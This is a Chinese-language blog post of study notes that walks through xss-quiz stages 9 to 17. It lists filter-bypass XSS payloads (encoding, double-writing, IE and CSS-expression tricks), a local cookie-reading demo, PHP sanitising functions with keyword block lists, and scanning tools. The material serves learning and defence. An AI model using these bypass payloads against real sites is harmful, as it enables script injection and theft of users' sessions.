+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(document.domain)"</span>&gt;</span>javascript:alert(document.domain)<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="utf-7-xss"><a href="#utf-7-xss" class="headerlink" title="utf-7 xss"></a>utf-7 xss</h2><blockquote>
+<p>stage #9 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage_09.php?sid=7e3613202c0e7cc4ed129d4c60b98dbe887aa456</a></p>
+</blockquote>
+<p>这里的utf-7 现在的浏览器已经移除了这种编码，危害较小</p>
+<p>所以这里取巧：</p>
+<p><img src="/images/xss_stage9.png" alt></p>
+<p><img src="/images/xss_stage9_1.png" alt></p>
+<p><img src="/images/xss_stage9_2.png" alt></p>
+<p>或者 点击跳过这关</p>
+<p><img src="/images/xss_stage.png" alt></p>
+<h2 id="绕过过滤domain为空的xss"><a href="#绕过过滤domain为空的xss" class="headerlink" title="绕过过滤domain为空的xss"></a>绕过过滤domain为空的xss</h2><blockquote>
+<p>stage #10 </p>
+<p><a href="http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/stage00010.php?sid=b86e436416bd0ed72ba8e07ffd237471e7bd006d</a></p>
+</blockquote>
+<p><img src="/images/xss_stage10.png" alt></p>
+<p><img src="/images/xss_stage10_1.png" alt></p>
+<p><img src="/images/xss_stage10_2.png" alt></p>
+<p><img src="/images/xss_stage10_3.png" alt></p>
+<p>domain被过滤，采取双写，编码绕过</p>
+<p>双写：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;svg/onload=alert(document.domdomainain)&gt;%0a</span></span><br></pre></td></tr></table></figure>
+
+<p>这里使用base64编绕过，也可以采用其他</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;script&gt;eval(atob("</span>YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==<span class="string">"));&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过替换script和on事件的xss"><a href="#绕过替换script和on事件的xss" class="headerlink" title="绕过替换script和on事件的xss"></a>绕过替换script和on事件的xss</h2><blockquote>
+<p>stage #11</p>
+<p><a href="https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage11th.php?sid=53f688b9e3f5640b32d4096f5b0b5e4f193e5b4a</a></p>
+</blockquote>
+<p>在伪协议中带空格仍然能执行</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">132456</span><span class="string">"&gt;&lt;a href="</span>javasc ript:alert(<span class="built_in">document</span>.domain);<span class="string">"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/xss_stage11.png" alt></p>
+<p>然而，404,空格换一下在script中间插入<code>&amp;#09;</code>，<code>&amp;#10;</code>，空格等不可见字符，让正则匹配不到。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123"&gt;&lt;a href="javasc&amp;#10;ript:alert(document.domain);"&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="IE特性绕过xss过滤"><a href="#IE特性绕过xss过滤" class="headerlink" title="IE特性绕过xss过滤"></a>IE特性绕过xss过滤</h2><blockquote>
+<p>stage #12</p>
+<p><a href="https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage_no012.php?sid=6bd3fefa2774a7d333026335d5f24239d7ebb75b</a></p>
+</blockquote>
+<p>这里过滤了&lt;,”,ie,有一特性  两个  `  号 可闭合 “</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">``</span> onmouseover=alert(<span class="built_in">document</span>.domain)</span><br></pre></td></tr></table></figure>
+
+<h2 id="css-特性绕过xss过滤"><a href="#css-特性绕过xss过滤" class="headerlink" title="css 特性绕过xss过滤"></a>css 特性绕过xss过滤</h2><blockquote>
+<p>stage #13</p>
+<p><a href="https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage13_0.php?sid=6c076a83715f2f3d68d7fa96051c8cba0d5528b2</a></p>
+</blockquote>
+<p>同样是在ie中，css特性： <code>;background:url(&quot;javascript:alert(document.dmain);&quot;)</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background-color:salmon;background:url(<span class="string">"javascript:alert(document.domain);"</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="css触发xss"><a href="#css触发xss" class="headerlink" title="css触发xss"></a>css触发xss</h2><h3 id="css介绍"><a href="#css介绍" class="headerlink" title="css介绍"></a>css介绍</h3><p>层叠样式表是一种用来表现html或xml等文件样式的计算机语言。css不仅可以静态的修饰网页，还可以配合各种脚本语言动态的对网页各元素进行格式化。</p>
+<h3 id="css中执行js"><a href="#css中执行js" class="headerlink" title="css中执行js"></a>css中执行js</h3><p>css expression(css 表达式)又称Dymamic properties(动态属性)是早期微软DHTML的产物，以其可以在css中定义表达式（公式）来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题、微软IE8 bate2标准模式开始，取消对css expression的支持。（实际应用：导航栏，返回顶部）</p>
+<h3 id="注释绕过关键字过滤"><a href="#注释绕过关键字过滤" class="headerlink" title="注释绕过关键字过滤"></a>注释绕过关键字过滤</h3><blockquote>
+<p>stage #14</p>
+<p><a href="https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-_-14.php?sid=eb2573e964a61b65bc4d456c9fae630ac19266c2</a></p>
+</blockquote>
+<p><code>/**/</code></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss:expres<span class="comment">/**/</span>sion(<span class="keyword">if</span>(!<span class="built_in">window</span>.x)&#123;alert(<span class="built_in">document</span>.domain);<span class="built_in">window</span>.x=<span class="number">1</span>;&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="16进制绕过过滤触发xss"><a href="#16进制绕过过滤触发xss" class="headerlink" title="16进制绕过过滤触发xss"></a>16进制绕过过滤触发xss</h2><p>符号 -&gt; 16</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\x"</span>+binascii.b2a_hex(<span class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>带上\x,js 可识别 </p>
+<blockquote>
+<p>stage #15</p>
+<p><a href="https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage__15.php?sid=e4954d390fd0e5d6a8dd4d1f3647e7f4095bcf2e</a></p>
+</blockquote>
+<p>经检测，&lt; &gt; \ 被过滤，&lt; 16进制为3c  &gt;16进制为3e</p>
+<p><img src="/images/xss_stage15.png" alt></p>
+<p><img src="/images/xss_stage15_1.png" alt></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\x3cscript\\x3ealert(<span class="built_in">document</span>.domain);\\x3c/script\\x3e</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ascii绕过过滤触发xss"><a href="#Ascii绕过过滤触发xss" class="headerlink" title="Ascii绕过过滤触发xss"></a>Ascii绕过过滤触发xss</h2><p>符号 -&gt; ascii</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> binascii</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> <span class="string">"\\u00"</span> + binascii.b2a_hex(<span class="string">"&lt;"</span>)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>stage #16</p>
+<p><a href="https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage00000016.php?sid=5286887e32a1526dc007701ca9e159eed22b992e</a></p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\u003cscript\\u003ealert(<span class="built_in">document</span>.domain);\\u003c/script\\u003e</span><br></pre></td></tr></table></figure>
+
+<h2 id="源"><a href="#源" class="headerlink" title="源"></a>源</h2><p>源：由协议，主机名，端口名组成（例：协议://主机名:端口号/）</p>
+<p>同源策略（SOP）：用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面</p>
+<h3 id="ie的特殊处理"><a href="#ie的特殊处理" class="headerlink" title="ie的特殊处理"></a>ie的特殊处理</h3><p>1.位于可信域的互信的域名间，不受同源策略限制</p>
+<p>2.ie在判断同源时不考虑端口</p>
+<h3 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h3><p>可通过document.domain读取或修改源；但有限制，修改之后的源不能通过其他脚本再次修改。</p>
+<p>domain属性可以解决因同源安全策略带来的不同文档的属性共享问题</p>
+<p>降域 document.domain,同源策略认为域和子域属于不同的域，如child.a.com 与 a.ocm,child2.a.com与child1.a.com,两两不同源，可设置document.domain=”a.com”,就同源了；想要设置以上任意两个页面通信 ，两个页面都必须设置document.domain=”a.com”。</p>
+<h2 id="cookie的httponly设置"><a href="#cookie的httponly设置" class="headerlink" title="cookie的httponly设置"></a>cookie的httponly设置</h2><p>消除cookie：Internet选项，常规</p>
+<h3 id="cookie-httponly"><a href="#cookie-httponly" class="headerlink" title="cookie httponly"></a>cookie httponly</h3><p>setcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie</p>
+<p>setcookie(<code>name</code>(必须。规定名称),<code>value</code>(必须，规定值),<code>expire</code>(有效期),<code>path</code>(服务器路径),<code>domain</code>( 域名),<code>secure</code>(是否通过安全的https连接来传输cookie),<code>httponly</code>)</p>
+<p>在本地实验：</p>
+<p><code>tescookie.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    setcookie(<span class="string">"user"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">FALSE</span>);</span><br><span class="line">    setcookie(<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">TRUE</span>);</span><br><span class="line">    $id = $_GET[<span class="string">"id"</span>];</span><br><span class="line">    <span class="keyword">echo</span> $id;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/testcookie.php?id=%3Cscript%3Edocument.write(document.cookie);%3C/script%3E</span><br></pre></td></tr></table></figure>
+
+<p>就会输出 user=admin，TRUE的pass就不会输出。</p>
+<h2 id="xss-filter-过滤器"><a href="#xss-filter-过滤器" class="headerlink" title="xss-filter 过滤器"></a>xss-filter 过滤器</h2><h3 id="防御函数"><a href="#防御函数" class="headerlink" title="防御函数"></a>防御函数</h3><p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp" target="_blank" rel="noopener">htmlspecialchars()函数</a></strong></p>
+<p>把预定义的字符转换为html实体</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure>
+
+<p><strong><a href="https://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">htmlentities()函数</a></strong></p>
+<p> 过滤用户输入的数据，将一些特殊字符串转换为html实体。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlentities(string,flags,character-set,double_encode)</span><br></pre></td></tr></table></figure>
+
+<p><strong><a href="https://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">strip_tags()函数</a></strong></p>
+<p>剥去字符串中得html、xml以及php的标签。</p>
+<blockquote>
+<p>该函数会剥离html注释，这点无法通过allow参数改变。</p>
+<p>该函数是二进制安全的。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strip_tags(string,allow)</span><br></pre></td></tr></table></figure>
+
+<p><strong>自定义xss filter</strong></p>
+<blockquote>
+<p>法一</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xss_clean</span><span class="params">($data)</span></span>&#123;</span><br><span class="line"> <span class="comment">// Fix &amp;entity＼n;</span></span><br><span class="line"> $data=str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>,<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>),<span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>,<span class="string">'&amp;lt;'</span>,<span class="string">'&amp;gt;'</span>),$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#*＼w+)[＼x00-＼x20]+;/u'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=preg_replace(<span class="string">'/(&amp;#x*[0-9A-F]+);*/iu'</span>,<span class="string">'$1;'</span>,$data);</span><br><span class="line"> $data=html_entity_decode($data,ENT_COMPAT,<span class="string">'UTF-8'</span>);</span><br><span class="line"> <span class="comment">// Remove any attribute starting with "on" or xmlns</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?[＼x00-＼x20"＼'</span>])(?:on|xmlns)[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove javascript: and vbscript: protocols</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=[＼x00-＼x20]*([`＼'</span><span class="string">"]*)[＼x00-＼x20]*j[＼x00-＼x20]*a[＼x00-＼x20]*v[＼x00-＼x20]*a[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:#iu','$1=$2nojavascript...',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#([a-z]*)[＼x00-＼x20]*=([＼'"</span>]*)[＼x00-＼x20]*v[＼x00-＼x20]*b[＼x00-＼x20]*s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:<span class="comment">#iu','$1=$2novbscript...',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#([a-z]*)[＼x00-＼x20]*=([＼'</span><span class="string">"]*)[＼x00-＼x20]*-moz-binding[＼x00-＼x20]*:#u','$1=$2nomozbinding...',$data);</span></span><br><span class="line"><span class="string"> // Only works in IE: &lt;span style="</span>width: expression(alert(<span class="string">'Ping!'</span>));<span class="string">"&gt;&lt;/span&gt;</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?expression[＼x00-＼x20]*＼([^&gt;]*+&gt;<span class="comment">#i','$1&gt;',$data);</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'</span><span class="string">"]*.*?behaviour[＼x00-＼x20]*＼([^&gt;]*+&gt;#i','$1&gt;',$data);</span></span><br><span class="line"><span class="string"> $data=preg_replace('#(&lt;[^&gt;]+?)style[＼x00-＼x20]*=[＼x00-＼x20]*[`＼'"</span>]*.*?s[＼x00-＼x20]*c[＼x00-＼x20]*r[＼x00-＼x20]*i[＼x00-＼x20]*p[＼x00-＼x20]*t[＼x00-＼x20]*:*[^&gt;]*+&gt;<span class="comment">#iu','$1&gt;',$data);</span></span><br><span class="line"> <span class="comment">// Remove namespaced elements (we do not need them)</span></span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*＼w+:＼w[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> <span class="keyword">do</span>&#123;<span class="comment">// Remove really unwanted tags</span></span><br><span class="line"> $old_data=$data;</span><br><span class="line"> $data=preg_replace(<span class="string">'#&lt;/*(?:applet|b(?:ase|gsound|link)|embed|frame(?:set)?|i(?:frame|layer)|l(?:ayer|ink)|meta|object|s(?:cript|tyle)|title|xml)[^&gt;]*+&gt;#i'</span>,<span class="string">''</span>,$data);</span><br><span class="line"> &#125;<span class="keyword">while</span>($old_data!==$data);</span><br><span class="line"> <span class="comment">// we are done...</span></span><br><span class="line"> <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>法二</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//php防注入和XSS攻击通用过滤.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//by qq:831937</span></span><br><span class="line"></span><br><span class="line">$_GET    &amp;&amp; SafeFilter($_GET);</span><br><span class="line">$_POST   &amp;&amp; SafeFilter($_POST);</span><br><span class="line">$_COOKIE &amp;&amp; SafeFilter($_COOKIE);</span><br><span class="line">functionSafeFilter (&amp;$arr)</span><br><span class="line">&#123; </span><br><span class="line">   $ra=<span class="keyword">Array</span>(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>,<span class="string">'/script/'</span>,<span class="string">'/javascript/'</span>,<span class="string">'/vbscript/'</span>,<span class="string">'/expression/'</span>,<span class="string">'/applet/'</span>,<span class="string">'/meta/'</span>,<span class="string">'/xml/'</span>,<span class="string">'/blink/'</span>,<span class="string">'/link/'</span>,<span class="string">'/style/'</span>,<span class="string">'/embed/'</span>,<span class="string">'/object/'</span>,<span class="string">'/frame/'</span>,<span class="string">'/layer/'</span>,<span class="string">'/title/'</span>,<span class="string">'/bgsound/'</span>,<span class="string">'/base/'</span>,<span class="string">'/onload/'</span>,<span class="string">'/onunload/'</span>,<span class="string">'/onchange/'</span>,<span class="string">'/onsubmit/'</span>,<span class="string">'/onreset/'</span>,<span class="string">'/onselect/'</span>,<span class="string">'/onblur/'</span>,<span class="string">'/onfocus/'</span>,<span class="string">'/onabort/'</span>,<span class="string">'/onkeydown/'</span>,<span class="string">'/onkeypress/'</span>,<span class="string">'/onkeyup/'</span>,<span class="string">'/onclick/'</span>,<span class="string">'/ondblclick/'</span>,<span class="string">'/onmousedown/'</span>,<span class="string">'/onmousemove/'</span>,<span class="string">'/onmouseout/'</span>,<span class="string">'/onmouseover/'</span>,<span class="string">'/onmouseup/'</span>,<span class="string">'/onunload/'</span>);</span><br><span class="line">   <span class="keyword">if</span>(is_array($arr))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">foreach</span>($arras</span><br><span class="line">$key  =&gt; $value)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_array($value))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span>(!get_magic_quotes_gpc())             <span class="comment">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span></span><br><span class="line">          &#123;</span><br><span class="line">             $value = addslashes($value);          <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）加上反斜线转义</span></span><br><span class="line">          &#125;</span><br><span class="line">          $value      = preg_replace($ra,<span class="string">''</span>,$value);    <span class="comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span></span><br><span class="line">          $arr[$key]     = htmlentities(strip_tags($value));<span class="comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          SafeFilter($arr[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h2><h3 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h3><p>将不安全的字符编码为安全字符在进行传输（通用得安全字母表）</p>
+<p>%+两个表示字符ascii的16进制数</p>
+<h3 id="html编码"><a href="#html编码" class="headerlink" title="html编码"></a>html编码</h3><p>一些保留字符出现在文本节点和标签值里不安全，如“&lt;&gt;”会导致刘安琪误以为标签</p>
+<p>实体编码</p>
+<p>一般&amp;开头，“;”结尾，可不加“；”。如”&lt;”转为”&lt;”</p>
+<p>进制编码</p>
+<p>以&amp;#开头，加上字符的数值，”;”结尾可不加。字符数值可以是任意十进制ASCII码或Unicode字符编码，十六进制的数值需要在编码数字前加”x“ .</p>
+<h3 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h3><p>\u +00 + ASCII码</p>
+<p>\x + ASCII码</p>
+<p><a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a></p>
+<h3 id="编码含义"><a href="#编码含义" class="headerlink" title="编码含义"></a>编码含义</h3><p>攻击绕过</p>
+<h2 id="xss过滤器绕过"><a href="#xss过滤器绕过" class="headerlink" title="xss过滤器绕过"></a>xss过滤器绕过</h2><p>xss payload测试</p>
+<p>kali路径：/usr/share/wordlists/wfuzz/Injections/xss.txt</p>
+<p>自动化探测，burp:Intruder模块，在positions设置注入位置；在payload中设置payload type为runtime file然后选择对应的xss payload，之后start attack。</p>
+<p><strong>关注最新的html等内容</strong></p>
+<p>例如更新了新标签，可进行xss测试</p>
+<p>参考 ：owasp.org</p>
+<h2 id="xss发生的位置"><a href="#xss发生的位置" class="headerlink" title="xss发生的位置"></a>xss发生的位置</h2><h3 id="get型url中的xss"><a href="#get型url中的xss" class="headerlink" title="get型url中的xss"></a>get型url中的xss</h3><p>如果url修改提交的参数值,在页面显示，很有可能存在(反射)xss</p>
+<h3 id="post表单中的xss"><a href="#post表单中的xss" class="headerlink" title="post表单中的xss"></a>post表单中的xss</h3><p>在表单中的提交修改的参数值，在页面中显示，很有可能存在xss</p>
+<p>form data</p>
+<h3 id="json中的xss"><a href="#json中的xss" class="headerlink" title="json中的xss"></a>json中的xss</h3><p>json(javascript object notation)是一种轻量级的数据交换格式，易于人阅读和编写，同时也易于机器解析和生成，并有效的提升网络传输效率</p>
+<p>json 最常见的格式是对象的键值对</p>
+<p>闭合前面+;alert(“xss”);//注释后面</p>
+<h3 id="自定义http头中的xss"><a href="#自定义http头中的xss" class="headerlink" title="自定义http头中的xss"></a>自定义http头中的xss</h3><p>如果在http自定义头中提交的参数值，在页面中显示。很有可能存在xss</p>
+<h2 id="存储型xss灰盒测试"><a href="#存储型xss灰盒测试" class="headerlink" title="存储型xss灰盒测试"></a>存储型xss灰盒测试</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>PHPstuday:搭建微程序，rocboss</p>
+<p>定向xss挖掘:探测漏洞位置，能存储的地方</p>
+<p>黑名单审计：查看filter，绕过黑名单</p>
+<p>绕过过滤，触发xss：绕过并针对漏洞攻击</p>
+<h2 id="自动挖掘工具"><a href="#自动挖掘工具" class="headerlink" title="自动挖掘工具"></a>自动挖掘工具</h2><p>xsser介绍：针对web应用程序自动化挖掘，利用，报告xss漏洞的框架</p>
+<p>原理：不断拼接payload</p>
+<p>帮助信息： xsser -h</p>
+<p>启动方式： 图像化 xsser- gtk</p>
+<p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">xsstrike</a></p>
+<blockquote>
+<p>stage #17</p>
+<p><a href="https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095" target="_blank" rel="noopener">https://xss-quiz.int21h.jp/stage-No17.php?sid=4f0dacf93ef764da56fd687692abc63e1a31e095</a></p>
+</blockquote>
+
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <hr>
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-08-12T09:30:14+08:00">
+  <a class='notlink'>
+    <i class="fas fa-clock" aria-hidden="true"></i>
+    <p>最后更新于 2019年8月12日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/xss/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>xss</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/web安全/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>web安全</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+            <div class="prev-next">
+                
+                    <section class="prev">
+                        <span class="art-item-left">
+                            <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
+                            <h4>
+                                <a href="/2019/08/08/无线安全之WiFi技术/" rel="prev" title="无线安全之WiFi技术">
+                                  
+                                      无线安全之WiFi技术
+                                  
+                                </a>
+                            </h4>
+                            
+                                
+                                <h6 class="tags">
+                                    <a class="tag" href="/tags/无线安全/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>无线安全</a>
+                                </h6>
+                            
+                        </span>
+                    </section>
+                
+                
+                    <section class="next">
+                        <span class="art-item-right" aria-hidden="true">
+                            <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
+                            <h4>
+                                <a href="/2019/08/04/python笔记/" rel="prev" title="python笔记">
+                                    
+                                        python笔记
+                                    
+                                </a>
+                            </h4>
+                            
+                                
+                                <h6 class="tags">
+                                    <a class="tag" href="/tags/python/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>python</a>
+                                </h6>
+                            
+                        </span>
+                    </section>
+                
+            </div>
+        
+      </section>
+    </article>
+  
+
+  
+    <!-- 显示推荐文章和评论 -->
+
+
+
+  <article class="post white-box comments">
+    <section class="article typo">
+      <h4><i class="fas fa-comments fa-fw" aria-hidden="true"></i>&nbsp;评论</h4>
+      
+      
+      
+      
+        <section id="comments">
+          <div id="valine_container" class="valine_thread">
+            <i class="fas fa-spinner fa-spin fa-fw"></i>
+          </div>
+        </section>
+      
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
